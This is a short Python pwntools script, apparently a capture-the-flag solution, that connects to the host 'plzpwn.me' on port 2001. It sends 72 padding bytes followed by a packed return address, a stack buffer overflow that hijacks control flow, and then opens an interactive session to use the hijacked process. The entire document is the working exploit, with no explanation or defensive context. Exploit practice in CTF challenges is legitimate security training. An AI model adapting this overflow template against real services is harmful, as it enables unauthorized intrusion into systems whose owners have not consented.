from pwn import *

p = remote("plzpwn.me",2001)
print(p.recv())
p.sendline('A'*72 + p32(0x80484d6))
p.interactive()
